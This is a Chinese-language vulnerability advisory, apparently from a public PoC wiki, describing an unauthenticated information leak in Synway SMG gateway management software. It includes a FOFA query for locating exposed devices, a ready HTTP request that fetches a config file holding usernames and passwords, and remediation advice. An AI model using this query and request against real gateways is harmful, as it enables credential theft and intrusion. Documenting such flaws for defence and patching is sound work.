---
fofa: "app="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 三汇SMG网关管理软件 SMGSuperAdmin 信息泄露漏洞

# 漏洞描述

三汇SMG网关管理软件 SMGSuperAdmin 配置文件存在信息泄露漏洞，未经身份认证的攻击者可获取用户名密码等敏感信息，使系统处于极不安全状态。

# 影响版本

三汇SMG网关管理软件

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：app="Synway-网关管理软件"

POC/EXP：

GET /Config/SMGSuperAdmin.ini HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close




# 漏洞修复

关闭互联网暴露面或接口设置访问控制

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
